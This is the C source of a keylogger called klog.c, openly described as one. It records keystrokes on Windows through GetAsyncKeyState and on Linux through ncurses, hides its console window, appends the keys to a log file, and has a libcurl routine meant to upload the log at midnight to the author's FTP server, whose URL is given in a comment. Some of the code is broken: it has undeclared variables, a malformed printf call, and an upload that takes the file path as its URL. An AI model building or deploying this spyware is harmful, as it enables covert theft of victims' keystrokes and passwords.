/*
 ===============================================================================
 Name        : klog.c
 Author      : Fastiraz
 Version     : 1.2
 Copyright   : Your copyright notice
 Description : A simple multi-platform keylogger in C.
 Compile     : cl klog.c user32.lib
 Usage       : ./klog.exe
 ===============================================================================
 */

/*============================================================================*/
#if defined(_WIN32) || defined(_WIN64)
    #include <windows.h>
    #include <conio.h>
    #define PATH "C:/Users/Administrator/Desktop/klog.txt"
#elif defined(__linux__) || defined(__APPLE__)
    #include <ncurses.h>
    #define PATH "/home/user/klog.txt" // Linux
#endif

#include <stdio.h>
#include <time.h>
#include <curl/curl.h> // FTP sender
/*============================================================================*/

/*============================================================================*/
int winklog();
int linklog();
int old(int argc, char ** argv);
int sender(const char *path);
/*============================================================================*/

/*============================================================================*/
int main() {
    #ifdef _WIN32
        winklog();
    #elif defined(__linux__) || defined(__APPLE__)
        linklog();
    #else
        printf("Error: unsupported operating system\n");
        exit(1);
    #endif

    return 0;
}
/*============================================================================*/

/*============================================================================*/
int winklog(){
    FILE *fp;
    fp = fopen(PATH, "a+");
    if (fp == NULL) {
        printf("Could not open file klog.txt\n");
        return 1;
    }

    while (1) {
      Sleep(20); // To make sure this program doesn't steal all resources.
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                fprintf(fp, "Key %d was pressed\n", i);
                printf("Key %d was pressed\n", i);
            }
        }
    }
    fclose(fp);
    return 0;
}
/*============================================================================*/

/*============================================================================*/
int linklog(){
    printf("En dev..."); // Linux klog
    initscr();
    cbreak();
    noecho();
    keypad(stdscr, TRUE);

    while (1)
    {
        int ch = getch();
        if (ch != ERR)
        {
            printw("Key %c was pressed\n", (char)ch);
            refresh();
        }
    }

    endwin();
}
/*============================================================================*/

/*============================================================================*/
int sender(const char *path){
  printf("This function allow me to send the log file to my server.\n", ); // It can be a FTP, Mail server or just by sockets.
  CURL *curl;
  CURLcode res;

  curl_global_init(CURL_GLOBAL_DEFAULT);

  curl = curl_easy_init();
  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, path); // curl_easy_setopt(curl, CURLOPT_URL, "ftp://fastiraz.io/path/to/upload/file.txt");
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READDATA, stdin);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
  }

  curl_global_cleanup();

  return (int)res;
}
/*============================================================================*/

/*============================================================================*/
int old(int argc, char ** argv){
    char capture;
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);

    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    file = fopen(PATH, "a+");
    fprintf(file, "\n#$Logger: NOT written by Fastiraz. Started logging @ %s", ctime(&time));

    while(1)
    {
        Sleep(20); // To make sure this program doesn't steal all resources.
        if (kbhit())
        {
            capture = getch();
            // Just add in some helper strings here to the file, feel free to modify these to your needs.
            switch ((int)capture){
                case ' ': // Space key...obviously.
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]"); // I can also replace it by a '\n' or just add it like '[ENTER]\n'
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,file); // Put any other inputted key into the file.
            }

            if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
                fclose(file);
                return 0;
            }

            /* Check if it's 00AM to sende the file to the FTP server */
            time(&current_time);
            local_time = localtime(&current_time);

            if (local_time->tm_hour == 0 && local_time->tm_min == 0) {
              // It's 00:00, do something
              sender(PATH);
            } else {
              // It's not 00:00, do something else
            }
        }
    }
}
/*============================================================================*/
